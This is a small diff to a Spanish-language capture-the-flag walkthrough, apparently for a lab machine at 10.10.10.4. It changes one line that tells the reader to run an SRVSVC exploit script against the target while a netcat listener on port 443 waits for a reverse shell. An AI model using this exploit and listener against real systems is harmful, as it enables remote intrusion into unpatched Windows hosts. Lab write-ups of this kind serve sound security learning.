@@ -341,7 +341,7 @@ current = SRVSVC_Exploit(target, os, port)
 current.start()
 ```
 
-Ahora solamente nos falta ejecutar el script con `python2.7 exploit.py 10.10.10.4 7` mientras estamos en escucha con [[rlwrap nc -lvnp 443]]
+Ahora solamente nos falta ejecutar el script con `python2.7 exploit.py 10.10.10.4 7` mientras estamos en escucha con [[rlwrap -cAr nc -lvnp 443]]
 Si te llegan a aparecer algunos errores. Mas abajo muestro los que me aparecian a mi y como los solucione
 
 ![[Legacy11.png]]
